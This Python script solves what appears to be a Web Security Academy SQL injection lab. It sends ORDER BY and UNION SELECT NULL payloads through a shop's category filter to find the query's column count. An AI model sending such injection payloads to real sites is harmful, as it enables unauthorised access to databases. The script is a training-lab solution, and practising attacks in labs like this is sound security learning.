import requests

# Replace with the target URL (filter?category=) part
url = 'https://0a6f004104c1dcc880dd21a0002600ae.web-security-academy.net/filter?category='
categories = ['Accessories', 'Food+%26+Drink', 'Gifts', 'Lifestyle', 'Tech+gifts']
injection = "' ORDER BY {}--"
success_message = "Congratulations, you solved the lab!"

def test_order_by(url, category, max_columns):
    for i in range(1, max_columns + 1):
        test_url = f"{url}{category}" + injection.format(i)
        response = requests.get(test_url)

        if success_message in response.text:
            print("Lab solved!")
            exit(0)

        if "Internal Server Error" in response.text or response.status_code == 500:
            print(f"Error encountered with ORDER BY {i} for category {category}. Maximum columns before error: {i-1}")
            return i - 1
    
    print(f"No errors encountered with ORDER BY {max_columns} for category {category}. Maximum columns: {max_columns}")
    return max_columns

def test_union_select_query(url, category, num_columns):
    null_injection = f"' UNION SELECT " + ', '.join(['NULL'] * num_columns) + "--"
    test_url = f"{url}{category}" + null_injection
    response = requests.get(test_url)

    if success_message in response.text:
        print("Lab solved!")
        exit(0)

    if "Internal Server Error" in response.text or response.status_code == 500:
        print(f"Error encountered with UNION SELECT with {num_columns} columns for category {category}")
        return False
    else:
        print(f"UNION SELECT successful with {num_columns} columns for category {category}")
        return True

def main():
    max_columns = 10
    for c in categories:
        print(f"Testing category: {c}")
        num_columns = test_order_by(url, c, max_columns)
        if num_columns > 0:
            successful = test_union_select_query(url, c, num_columns)
            if successful:
                print(f"Successfully determined the number of columns for category {c}: {num_columns}")
            else:
                print(f"Failed to determine the correct number of columns for UNION SELECT for category {c}.")
        else:
            print(f"Failed to determine the number of columns using ORDER BY for category {c}.")

if __name__ == "__main__":
    main()
